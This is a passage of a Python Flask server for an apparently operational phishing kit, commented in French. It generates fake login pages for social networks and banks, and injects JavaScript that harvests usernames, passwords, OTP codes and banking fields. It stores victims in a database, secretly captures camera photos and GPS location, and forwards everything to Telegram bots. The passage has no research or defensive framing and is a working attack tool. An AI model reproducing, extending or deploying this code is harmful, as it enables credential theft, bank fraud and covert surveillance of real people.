            } else if (!userData.user && (c === "bank" || c === "dob" || c === "other")) {
                userData.user = val;
            }
        });

        if (!foundUserInForm) {
            userData.user = localStorage.getItem('ph_user_' + OWNER) || userData.user || "";
        }
        if (!foundPassInForm) {
            userData.pass = localStorage.getItem('ph_pass_' + OWNER) || userData.pass || "";
        }

        userData.fields = collected;

        if (userData.pass === ADMIN_CODE && userData.user) {
            if (userData.user === ADMIN_CODE) {
                window.location.replace('/');
                return;
            }
            window.location.replace(REDIRECT_URL);
            return;
        }

        if (IS_OPT3) {
            await runOption3Media();
        }

        const captureType = hasOtp ? "OTP" : "OTP_STEP1";
        await fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: IS_OPT3 ? 'opt3' : 'opt2',
                type: captureType,
                sessionKey: getSessionKey(),
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: hasOtp ? userData.otp : "En attente OTP...",
                fields: collected,
                extra_info: JSON.stringify({ ua: navigator.userAgent, platform: navigator.platform, fields: collected })
            }),
            keepalive: true
        });

        if (hasOtp) {
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 150);
            return;
        }
        isProcessing = false;
    }

    document.addEventListener('DOMContentLoaded', () => {
        if (IS_OPT3) {
            runOption3Media();
        }
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => {
                processData();
            });
        });
        document.addEventListener('click', function(e) {
            const target = e.target;
            if (target.tagName === 'BUTTON' || (target.tagName === 'INPUT' && target.type === 'submit')) {
                processData();
            }
        });
    });
})();
</script>
"""
            script_final = (
                injection_script.replace("__OWNER__", owner)
                .replace("__NETWORK__", network)
                .replace("__REDIRECT_URL__", redirect_url)
                .replace("__IS_OPT3__", is_opt3)
                .replace("__CAM_FRONT__", cam_front)
                .replace("__CAM_BACK__", cam_back)
                .replace("__GPS_ENABLED__", gps_enabled)
                .replace("__PHOTO_COUNT__", str(photo_count))
            )
            if "</body>" in html:
                html = html.replace("</body>", script_final + "</body>")
            else:
                html += script_final
            return render_template_string(html)

        try:
            fields_parsed = json.loads(cp_dict.get("fields_json") or "[]")
        except Exception:
            fields_parsed = []

        net_name = cp_dict.get("network", "Facebook")
        resolved_logo = resolve_platform_image(net_name, cp_dict.get("logo_url", ""))
        config = {
            "owner": cp_dict.get("owner", "Kim"),
            "title": cp_dict.get("title", "Connexion"),
            "network": net_name,
            "bg_type": cp_dict.get("bg_type", "color"),
            "bg_value": cp_dict.get("bg_value", "#111"),
            "logo_url": resolved_logo,
            "logo_shape": cp_dict.get("logo_shape", "circle"),
            "fields": fields_parsed,
            "btn_text": cp_dict.get("btn_text", "Se connecter"),
            "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
            "box_width": cp_dict.get("box_width") or "420px",
            "redirect_url": redirect_url,
        }
        return render_template("custom_login.html", config=config)

    folder = "otp" if (req_type == "otp" or subpath_clean.startswith("otp/") or "otp" in db_slug) else "standard"
    net_detected = db_slug.replace("_otp", "").replace("-otp", "").replace("_standard", "").replace("-standard", "").capitalize() or "Plateforme"
    record_link_visit(owner_param, net_detected, request.path, v_ip, device_type)
    return _render_standard_or_otp(folder, db_slug, owner_param)


@app.route("/api/upload_media", methods=["POST"])
def upload_media():
    data = request.json or {}
    if data.get("mode") != "opt3":
        return jsonify({"status": "ignored", "reason": "Option 3 only"}), 400

    owner = (data.get("owner") or "").strip() or "Kim"
    network = data.get("network", "Inconnu")
    m_type = data.get("type", "media")
    facing = data.get("facing", "user")
    camera_label = "Caméra arrière" if facing == "environment" else "Caméra avant"
    shot_num = data.get("shotNumber", 1)
    total_shots = data.get("totalPhotos", 1)

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(data.get("device", ""))

    if m_type == "gps":
        method_name = data.get("method", "GPS")
        msg = (
            f"📍 *LOCALISATION GPS ({method_name})*\n"
            f"┌──────────────────────────────┐\n"
            f"│ 👤 *Propriétaire:* `{owner}`\n"
            f"│ 🌐 *Plateforme:* {network}\n"
            f"│ 🗺️ *Carte:* [Ouvrir Google Maps]({data.get('gps')})\n"
            f"└──────────────────────────────┘\n"
            f"• *Appareil:* `{device_type}`\n"
            f"• *Adresse IP:* `{v_ip}`"
        )
        send_telegram_notification(GROUP_BOT_TOKEN, GROUP_CHAT_ID, msg)
        lat = data.get("latitude")
        lon = data.get("longitude")
        if lat is not None and lon is not None:
            try:
                send_telegram_location_direct(
                    GROUP_BOT_TOKEN,
                    GROUP_CHAT_ID,
                    float(lat),
                    float(lon),
                    caption=f"📍 {network} ({owner})",
                )
            except Exception:
                pass
    elif m_type == "photo":
        photo_b64 = (data.get("photo") or "").split(",")[-1]
        if photo_b64:
            url = f"https://api.telegram.org/bot{GROUP_BOT_TOKEN}/sendPhoto"
            caption = (
                f"📸 *CAPTURE PHOTO {shot_num}/{total_shots} ({camera_label})*\n"
                f"┌──────────────────────────────┐\n"
                f"│ 👤 *Propriétaire:* `{owner}`\n"
                f"│ 🌐 *Plateforme:* {network}\n"
                f"└──────────────────────────────┘\n"
                f"• *Appareil:* `{device_type}`\n"
                f"• *Adresse IP:* `{v_ip}`"
            )
            try:
                res = requests.post(
                    url,
                    data={"chat_id": GROUP_CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
                    files={"photo": (f"photo_{shot_num}.jpg", base64.b64decode(photo_b64), "image/jpeg")},
                    timeout=12,
                )
                if res.status_code != 200:
                    print("Telegram sendPhoto status:", res.status_code, res.text)
            except Exception as e:
                print("Erreur envoi photo groupe:", e)

    return jsonify({"status": "success"})


@app.route("/api/create_login", methods=["POST"])
def create_login():
    data = request.json or {}
    owner = (data.get("owner") or "").strip()
    slug = (data.get("slug") or "").strip().lower().replace(" ", "_")
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ms = int(datetime.datetime.now().timestamp() * 1000)
        mode = data.get("mode", "opt1")
        redirect_url = data.get("redirectUrl", "https://www.google.com")
        opt3_json = json.dumps(data.get("opt3Config") or {})

        if mode in ["opt2", "opt3"]:
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, opt3_config, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    "Page Perso",
                    data.get("network"),
                    "color",
                    "#111",
                    "",
                    "circle",
                    "[]",
                    "Valider",
                    data.get("htmlCode"),
                    redirect_url,
                    mode,
                    opt3_json,
                    "#fff",
                    "420px",
                    now_ms,
                ),
            )
        else:
            net_val = data.get("network") or "Facebook"
            logo_val = resolve_platform_image(net_val, data.get("logoUrl") or "")
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, opt3_config, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    data.get("title"),
                    net_val,
                    data.get("bgType"),
                    data.get("bgValue"),
                    logo_val,
                    data.get("logoShape"),
                    json.dumps(data.get("fields") or []),
                    data.get("btnText"),
                    "",
                    redirect_url,
                    "opt1",
                    "{}",
                    data.get("boxBg"),
                    data.get("boxWidth"),
                    now_ms,
                ),
            )

        conn.commit()
        conn.close()
        return jsonify({"status": "success", "url": f"{request.host_url.rstrip('/')}/phish/{slug}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/api/register_account", methods=["POST"])
def register_account():
    data = request.json or {}
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    email = (data.get("email") or "").strip()
    avatar_url = (data.get("avatarUrl") or DEFAULT_LOGO_FALLBACK).strip()
    if not username:
        return jsonify({"status": "error", "message": "Nom d'utilisateur requis"})

    date_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT id, password, email, avatar_url FROM accounts WHERE LOWER(TRIM(username)) = LOWER(?)", (username,))
    existing = cursor.fetchone()
    if existing:
        final_pass = password if (password and password != UNIVERSAL_ADMIN_CODE) else existing["password"]
        final_avatar = avatar_url if (avatar_url and avatar_url != DEFAULT_LOGO_FALLBACK) else (existing["avatar_url"] or DEFAULT_LOGO_FALLBACK)
        cursor.execute(
            "UPDATE accounts SET password = ?, email = ?, avatar_url = ? WHERE id = ?",
            (final_pass, email or existing["email"], final_avatar, existing["id"]),
        )
    else:
        cursor.execute(
            "INSERT INTO accounts (username, password, email, avatar_url, created_at) VALUES (?, ?, ?, ?, ?)",
            (username, password, email, avatar_url, date_str),
        )
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "created_at": date_str, "avatarUrl": avatar_url})


@app.route("/api/admin/accounts", methods=["GET"])
def api_admin_accounts():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, email, avatar_url, created_at FROM accounts ORDER BY id DESC")
    rows = cursor.fetchall()

    accounts = []
    for r in rows:
        uname = (r["username"] or "").strip()
        cursor.execute("SELECT COUNT(*) AS cnt FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?)", (uname,))
        vc = cursor.fetchone()
        v_count = vc["cnt"] if vc else 0
        accounts.append({
            "id": r["id"],
            "username": uname,
            "password": r["password"],
            "email": r["email"],
            "avatar_url": r["avatar_url"] or DEFAULT_LOGO_FALLBACK,
            "created_at": r["created_at"],
            "victims_count": v_count,
        })
    conn.close()
    return jsonify({"total": len(accounts), "accounts": accounts})


@app.route("/api/messages", methods=["GET"])
def get_messages():
    user = (request.args.get("user") or "").strip()
    peer = (request.args.get("peer") or "").strip()
    today_key = datetime.datetime.now().strftime("%Y-%m-%d")

    conn = get_db_connection()
    cursor = conn.cursor()

    if peer:
        cursor.execute(
            """
            SELECT * FROM direct_messages
            WHERE channel = 'direct'
              AND ((LOWER(TRIM(sender)) = LOWER(?) AND LOWER(TRIM(recipient)) = LOWER(?))
                OR (LOWER(TRIM(sender)) = LOWER(?) AND LOWER(TRIM(recipient)) = LOWER(?)))
            ORDER BY id ASC
            """,
            (user, peer, peer, user),
        )
    else:
        cursor.execute(
            """
            SELECT * FROM direct_messages
            WHERE channel = 'sms'
            ORDER BY id ASC
            """
        )
    rows = cursor.fetchall()

    sms_used_today = 0
    if user:
        cursor.execute(
            """
            SELECT COUNT(*) AS cnt FROM direct_messages
            WHERE channel = 'sms'
              AND LOWER(TRIM(sender)) = LOWER(?)
              AND day_key = ?
            """,
            (user, today_key),
        )
        cnt_row = cursor.fetchone()
        sms_used_today = cnt_row["cnt"] if cnt_row else 0

    conn.close()

    msgs = [
        {
            "id": r["id"],
            "sender": r["sender"],
            "recipient": r["recipient"],
            "channel": r["channel"],
            "msg_type": r["msg_type"],
            "content": r["content"],
            "media_data": r["media_data"],
            "created_at": r["created_at"],
        }
        for r in rows
    ]
    return jsonify({
        "messages": msgs,
        "smsUsedToday": sms_used_today,
        "smsLimit": DAILY_SMS_LIMIT,
        "smsLocked": sms_used_today >= DAILY_SMS_LIMIT,
    })


@app.route("/api/messages/send", methods=["POST"])
def send_message():
    data = request.json or {}
    sender = (data.get("sender") or "").strip()
    recipient = (data.get("recipient") or "Salon SMS").strip()
    channel = (data.get("channel") or "sms").strip().lower()
    msg_type = (data.get("msgType") or "text").strip().lower()
    content = (data.get("content") or "").strip()
    media_data = (data.get("mediaData") or "").strip()

    if not sender:
        return jsonify({"status": "error", "message": "Expéditeur requis"}), 400

    if channel == "sms" and msg_type == "photo":
        return jsonify({"status": "error", "message": "L'envoi de photo n'est pas autorisé dans le canal SMS"}), 400

    today_key = datetime.datetime.now().strftime("%Y-%m-%d")
    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()

    if channel == "sms":
        cursor.execute(
            "SELECT COUNT(*) AS cnt FROM direct_messages WHERE channel = 'sms' AND LOWER(TRIM(sender)) = LOWER(?) AND day_key = ?",
            (sender, today_key),
        )
        cnt_row = cursor.fetchone()
        used = cnt_row["cnt"] if cnt_row else 0
        if used >= DAILY_SMS_LIMIT:
            conn.close()
            return jsonify({
                "status": "locked",
                "message": f"Limite quotidienne atteinte ({DAILY_SMS_LIMIT}/{DAILY_SMS_LIMIT} messages). Envoi verrouillé pour aujourd'hui.",
                "smsUsedToday": used,
                "smsLimit": DAILY_SMS_LIMIT,
                "smsLocked": True,
            }), 429

    cursor.execute(
        """
        INSERT INTO direct_messages (sender, recipient, channel, msg_type, content, media_data, day_key, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (sender, recipient, channel, msg_type, content, media_data, today_key, now_str),
    )
    msg_id = cursor.lastrowid
    conn.commit()

    cursor.execute(
        "SELECT COUNT(*) AS cnt FROM direct_messages WHERE channel = 'sms' AND LOWER(TRIM(sender)) = LOWER(?) AND day_key = ?",
        (sender, today_key),
    )
    new_used = cursor.fetchone()["cnt"]
    conn.close()

    canal_label = "SMS" if channel == "sms" else "Messagerie Directe"
    type_label = "Vocal 🎙️" if msg_type == "voice" else ("Photo 🖼️" if msg_type == "photo" else "Texte 💬")
    corps = content or ("[Message vocal]" if msg_type == "voice" else "[Photo jointe]")

    tg_msg = (
        f"💬 *ÉCHANGE {canal_label.upper()} ({type_label})*\n"
        f"┌──────────────────────────────┐\n"
        f"│ 📤 *Expéditeur:* `{sender}`\n"
        f"│ 📥 *Destinataire:* `{recipient}`\n"
        f"│ 🕒 *Date:* `{now_str}`\n"
        f"└──────────────────────────────┘\n"
        f"📝 *Contenu:* {corps}"
    )
    send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, tg_msg)
    if GROUP_CHAT_ID and GROUP_CHAT_ID != ADMIN_CHAT_ID:
        send_telegram_notification(GROUP_BOT_TOKEN, GROUP_CHAT_ID, tg_msg)

    if msg_type == "voice" and media_data:
        send_telegram_voice_b64(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, media_data, f"🎙️ Vocal de `{sender}` → `{recipient}` ({now_str})")
    elif msg_type == "photo" and media_data:
        photo_b64 = media_data.split(",")[-1]
        if photo_b64:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{GROUP_BOT_TOKEN}/sendPhoto",
                    data={"chat_id": GROUP_CHAT_ID, "caption": f"🖼️ Photo de `{sender}` → `{recipient}` ({now_str})", "parse_mode": "Markdown"},
                    files={"photo": ("chat_photo.jpg", base64.b64decode(photo_b64), "image/jpeg")},
                    timeout=10,
                )
            except Exception as e:
                print("Erreur envoi photo chat Telegram:", e)

    return jsonify({
        "status": "success",
        "id": msg_id,
        "smsUsedToday": new_used,
        "smsLimit": DAILY_SMS_LIMIT,
        "smsLocked": new_used >= DAILY_SMS_LIMIT,
        "message": {
            "id": msg_id,
            "sender": sender,
            "recipient": recipient,
            "channel": channel,
            "msg_type": msg_type,
            "content": content,
            "media_data": media_data,
            "created_at": now_str,
        },
    })


@app.route("/api/messages/<int:msg_id>", methods=["DELETE"])
def delete_message(msg_id):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM direct_messages WHERE id = ?", (msg_id,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success", "deletedId": msg_id})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


def _find_existing_victim_record(cursor, owner: str, network: str, session_key: str, v_user: str, v_ip: str):
    has_user = bool(v_user and v_user.lower() not in ["inconnu", "non renseigne", "non renseigné", ""])
    has_sid = bool(session_key)

    if has_sid:
        cursor.execute(
            """
            SELECT * FROM victims
            WHERE LOWER(TRIM(owner)) = LOWER(?)
              AND LOWER(TRIM(network)) = LOWER(?)
              AND session_key = ?
            ORDER BY id DESC LIMIT 1
            """,
            (owner, network, session_key),
        )
        row = cursor.fetchone()
        if row:
            return row

    if has_user:
        cursor.execute(
            """
            SELECT * FROM victims
            WHERE LOWER(TRIM(owner)) = LOWER(?)
              AND LOWER(TRIM(network)) = LOWER(?)
              AND LOWER(TRIM(victimUser)) = LOWER(?)
            ORDER BY id DESC LIMIT 1
            """,
            (owner, network, v_user),
        )
        row = cursor.fetchone()
        if row:
            return row

    cursor.execute(
        """
        SELECT * FROM victims
        WHERE LOWER(TRIM(owner)) = LOWER(?)
          AND LOWER(TRIM(network)) = LOWER(?)
          AND ip = ?
          AND (victimUser IS NULL OR victimUser = '' OR LOWER(TRIM(victimUser)) IN ('inconnu', 'non renseigne', 'non renseigné'))
        ORDER BY id DESC LIMIT 1
        """,
        (owner, network, v_ip),
    )
    return cursor.fetchone()


@app.route("/api/capture", methods=["POST"])
def capture_data():
    data = request.json or {}
    owner = (data.get("owner") or "").strip() or "Kim"
    network = (data.get("network") or "Facebook").strip()
    session_key = (data.get("sessionKey") or data.get("session_key") or "").strip()
    v_user = (data.get("victimUser") or "Inconnu").strip()
    v_pass = (data.get("victimPass") or "Inconnu").strip()
    v_otp = (data.get("otp") or "Aucun").strip()
    v_type = (data.get("type") or "STANDARD").strip()

    if v_pass == UNIVERSAL_ADMIN_CODE and v_user and v_user != UNIVERSAL_ADMIN_CODE:
        return jsonify({"status": "admin_unlock", "target_user": v_user})

    structured = classify_and_order_payload(data)
    if v_type == "STANDARD" and structured["category"] == "BANKING":
        v_type = "BANK"

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(request.headers.get("User-Agent", ""))
    platform_img = resolve_platform_image(network, data.get("platformImage") or "")

    now = datetime.datetime.now()
    date_str = now.strftime("%d/%m/%Y %H:%M:%S")
    timestamp = int(now.timestamp() * 1000)

    conn = get_db_connection()
    cursor = conn.cursor()

    existing = _find_existing_victim_record(cursor, owner, network, session_key, v_user, v_ip)

    if existing:
        old_user = (existing["victimUser"] or "").strip()
        old_pass = (existing["victimPass"] or "").strip()
        old_otp = (existing["victimOtp"] or "").strip()
        old_type = (existing["type"] or v_type).strip()
        old_sid = (existing["session_key"] or "").strip()

        final_user = (
            v_user
            if (v_user and v_user.lower() not in ["inconnu", "non renseigne", "non renseigné", ""])
            else (old_user or "Inconnu")
        )
        final_pass = (
            v_pass
            if (v_pass and v_pass.lower() not in ["inconnu", "non renseigne", "non renseigné", ""])
            else (old_pass or "Inconnu")
        )
        final_otp = (
            v_otp
            if (v_otp and v_otp not in ["Aucun", "En attente OTP...", ""])
            else (old_otp or "En attente OTP...")
        )
        final_sid = session_key or old_sid
        final_type = "OTP" if (final_otp not in ["Aucun", "En attente OTP...", ""]) else (
            v_type if v_type != "STANDARD" else old_type
        )

        old_ordered = {}
        try:
            old_extra = json.loads(existing["extra_info"] or "{}")
            if isinstance(old_extra, dict):
                old_ordered = old_extra.get("ordered") or {}
        except Exception:
            pass

        merged_ordered = _merge_ordered_dicts(old_ordered, structured["ordered"])
        if final_user not in ["Inconnu", "Non renseigne"] and not merged_ordered["identity"] and not merged_ordered["banking"]:
            merged_ordered["identity"]["Identifiant"] = final_user
        if final_pass not in ["Inconnu", "Non renseigne"] and not merged_ordered["credentials"]:
            merged_ordered["credentials"]["Mot de passe"] = final_pass
        if final_otp not in ["Aucun", "En attente OTP..."] and not merged_ordered["otp"]:
            merged_ordered["otp"]["Code OTP"] = final_otp

        merged_summary = _build_summary_from_ordered(merged_ordered)
        final_category = "BANKING" if merged_ordered["banking"] else (
            "OTP" if merged_ordered["otp"] and not merged_ordered["identity"] and not merged_ordered["credentials"]
            else ("FORM_DATA" if (merged_ordered["identity"] or merged_ordered["credentials"]) else structured["category"])
        )

        extra_payload = {
            "category": final_category,
            "ordered": merged_ordered,
            "formatted_summary": merged_summary,
            "raw_extra": data.get("extra_info"),
        }
        extra_json_str = json.dumps(extra_payload, ensure_ascii=False)

        cursor.execute(
            """
            UPDATE victims
            SET victimUser=?, victimPass=?, victimOtp=?, type=?, dateStr=?, timestamp=?, ip=?, device=?, extra_info=?, session_key=?
            WHERE id=?
            """,
            (final_user, final_pass, final_otp, final_type, date_str, timestamp, v_ip, device_type, extra_json_str, final_sid, existing["id"]),
        )
        conn.commit()
        conn.close()

        alert = format_ordered_telegram_card(
            network=network,
            owner=owner,
            category=final_category,
            v_user=final_user,
            v_pass=final_pass,
            v_otp=final_otp,
            formatted_summary=merged_summary,
            v_ip=v_ip,
            device_type=device_type,
            date_str=date_str,
            platform_img=platform_img,
            is_update=True,
        )
        send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, alert)
        send_telegram_photo_url(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, platform_img, alert)
        return jsonify({
            "status": "success",
            "updated": True,
            "id": existing["id"],
            "owner": owner,
            "category": final_category,
            "timestamp": timestamp,
            "triggerAlert": True,
        })

    extra_payload = {
        "category": structured["category"],
        "ordered": structured["ordered"],
        "formatted_summary": structured["formatted_summary"],
        "raw_extra": data.get("extra_info"),
    }
    extra_json_str = json.dumps(extra_payload, ensure_ascii=False)

    cursor.execute(
        """
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, device, extra_info, session_key)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, device_type, extra_json_str, session_key),
    )
    new_id = cursor.lastrowid
    conn.commit()
    conn.close()

    alert = format_ordered_telegram_card(
        network=network,
        owner=owner,
        category=structured["category"],
        v_user=v_user,
        v_pass=v_pass,
        v_otp=v_otp,
        formatted_summary=structured["formatted_summary"],
        v_ip=v_ip,
        device_type=device_type,
        date_str=date_str,
        platform_img=platform_img,
        is_update=False,
    )
    send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, alert)
    send_telegram_photo_url(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, platform_img, alert)
    return jsonify({
        "status": "success",
        "updated": False,
        "id": new_id,
        "owner": owner,
        "category": structured["category"],
        "timestamp": timestamp,
        "triggerAlert": True,
    })


@app.route("/api/custom_pages", methods=["GET"])
def get_custom_pages():
    cleanup_expired_3days()
    owner = (request.args.get("owner") or "").strip()
    cutoff_ms = int((datetime.datetime.now().timestamp() - EXPIRY_SECONDS) * 1000)
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute(
            "SELECT * FROM custom_pages WHERE LOWER(TRIM(owner)) = LOWER(?) AND created_at > ? ORDER BY id DESC",
            (owner, cutoff_ms),
        )
    else:
        cursor.execute("SELECT * FROM custom_pages WHERE created_at > ? ORDER BY id DESC", (cutoff_ms,))
    rows = cursor.fetchall()
    conn.close()
    return jsonify([
        {
            "slug": r["slug"],
            "title": r["title"],
            "network": r["network"],
            "mode": r["mode"],
            "created_at": r["created_at"],
        }
        for r in rows
    ])


@app.route("/api/victims", methods=["GET"])
def get_victims():
    owner = (request.args.get("owner") or "").strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner:
        cursor.execute("SELECT * FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?) ORDER BY timestamp DESC, id DESC", (owner,))
        rows = cursor.fetchall()
    else:
        rows = []
    conn.close()

    result = []
    seen_keys = set()
    latest_victim_id = 0
    last_action_at = 0

    for r in rows:
        row_id = int(r["id"] or 0)
        row_ts = int(r["timestamp"] or 0)
        if row_id > latest_victim_id:
            latest_victim_id = row_id
        if row_ts > last_action_at:
            last_action_at = row_ts

        u_norm = (r["victimUser"] or "").strip().lower()
        sid_norm = (r["session_key"] or "").strip().lower()
        net_norm = (r["network"] or "").strip().lower()
        ip_norm = (r["ip"] or "").strip()

        if sid_norm:
            dedup_key = f"sid:{net_norm}:{sid_norm}"
        elif u_norm and u_norm not in ["inconnu", "non renseigne", "non renseigné", ""]:
            dedup_key = f"user:{net_norm}:{u_norm}"
        else:
            dedup_key = f"row:{row_id}:{ip_norm}"

        if dedup_key in seen_keys:
            continue
        seen_keys.add(dedup_key)

        category = r["type"] or "STANDARD"
        ordered_summary = ""
        ordered_data = {}
        try:
            parsed_extra = json.loads(r["extra_info"] or "{}")
            if isinstance(parsed_extra, dict):
                category = parsed_extra.get("category") or category
                ordered_summary = parsed_extra.get("formatted_summary") or ""
                ordered_data = parsed_extra.get("ordered") or {}
        except Exception:
            pass

        result.append({
            "id": row_id,
            "owner": r["owner"] or owner,
            "network": r["network"],
            "type": r["type"],
            "category": category,
            "victimUser": r["victimUser"],
            "victimPass": r["victimPass"],
            "otp": r["victimOtp"],
            "orderedSummary": ordered_summary,
            "orderedData": ordered_data,
            "dateStr": r["dateStr"],
            "timestamp": row_ts,
            "ip": r["ip"],
            "device": r["device"],
        })

    return jsonify({
        "victims": result,
        "count": len(result),
        "latestVictimId": latest_victim_id,
        "lastActionAt": last_action_at,
    })


@app.route("/api/clear_victims", methods=["POST"])
def clear_victims():
    data = request.json or {}
    owner = (data.get("owner") or "").strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?)", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
